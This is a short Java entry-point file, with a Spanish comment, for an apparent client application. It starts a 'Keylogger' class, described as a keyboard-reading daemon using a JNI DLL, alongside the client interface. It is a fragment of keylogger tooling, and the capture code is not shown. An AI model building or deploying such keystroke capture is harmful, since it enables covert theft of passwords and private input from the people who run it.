/**
 * Integra la interfaz de cliente con el demonio que lee el teclado
 * con la libreria externa dll de jni
 */

import servicios.cliente.Cliente;

public class PrincipalCliente {

    public static void main(String[] args) {
        new Keylogger().start();
        Cliente.main(null);
    }
}
